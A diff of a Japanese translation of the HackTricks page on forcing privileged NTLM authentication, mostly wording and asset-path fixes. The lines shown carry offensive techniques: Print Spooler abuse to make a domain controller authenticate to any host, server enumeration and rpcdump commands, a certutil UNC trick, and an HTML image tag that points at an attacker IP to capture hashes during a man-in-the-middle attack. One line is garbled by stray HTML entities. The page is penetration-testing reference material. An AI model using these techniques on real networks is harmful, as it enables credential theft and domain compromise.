@@ -1,15 +1,15 @@
 # Force NTLM Privileged Authentication
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -17,16 +17,16 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、**3rd party** 依存関係を避けるために MIDL コンパイラを使用して C# でコーディングされた **リモート認証トリガー** の **コレクション** です。
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、**3rd party dependencies**を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガー**の**コレクション**です。
 
 ## Spooler Service Abuse
 
-_**Print Spooler**_ サービスが **有効** の場合、既知の AD 認証情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの **更新** を **要求** し、**通知を任意のシステムに送信するように指示** できます。\
-プリンターが任意のシステムに通知を送信する際には、その **システムに対して認証する必要があります**。したがって、攻撃者は _**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では **コンピュータアカウント** を **使用します**。
+_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を任意のシステムに送信するように指示**できます。\
+プリンターが任意のシステムに通知を送信する際には、その**システムに対して認証する必要があります**。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証には**コンピュータアカウント**が使用されます。
 
 ### Finding Windows Servers on the domain
 
-PowerShell を使用して、Windows ボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう：
+PowerShellを使用して、Windowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
@@ -41,7 +41,7 @@ Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともで�
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### 任意のホストに対してサービスに認証を要求する
+### サービスに任意のホストに対して認証を要求させる
 
 [**ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
@@ -109,26 +109,26 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### MitM
 
-コンピュータに対してMitM攻撃を実行し、彼が視覚化するページにHTMLを注入できる場合、次のような画像をページに注入してみることができます：
+もしあなたがコンピュータに対してMitM攻撃を実行し、彼が視覚化するページにHTMLを注入できるなら、次のような画像をページに注入してみることができます：
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 ## NTLMv1のクラッキング
 
-[NTLMv1チャレンジをキャプチャできる場合は、ここでそれらをクラッキングする方法を読んでください](../ntlm/#ntlmv1-attack)。\
-_ NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_
+[NTLMv1チャレンジをキャプチャできる場合は、ここでそれをクラッキングする方法を読んでください](../ntlm/#ntlmv1-attack)。\
+&#xNAN;_&#x52;NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_
 
 {% hint style="success" %}
-AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、練習する：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してハッキングトリックを共有してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
